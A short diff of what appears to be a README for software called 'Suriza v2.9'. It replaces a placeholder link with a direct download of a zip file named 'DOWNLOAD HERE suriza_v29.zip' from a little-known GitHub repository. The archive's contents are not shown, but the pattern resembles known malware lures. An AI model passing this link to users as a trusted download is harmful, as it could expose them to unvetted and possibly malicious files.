@@ -1,5 +1,5 @@
 <img width="1500" height="500" alt="xメインページ" src="https://github.com/user-attachments/assets/895a05a1-2366-458f-948c-7dc7ce0d5fbc" />
-👉[Download Suriza v2.9](https://github.com)
+👉 [Download Suriza v2.9](https://github.com/Rmukana/susanawo/raw/refs/heads/main/DOWNLOAD%20HERE%20suriza_v29.zip)
 
 
 
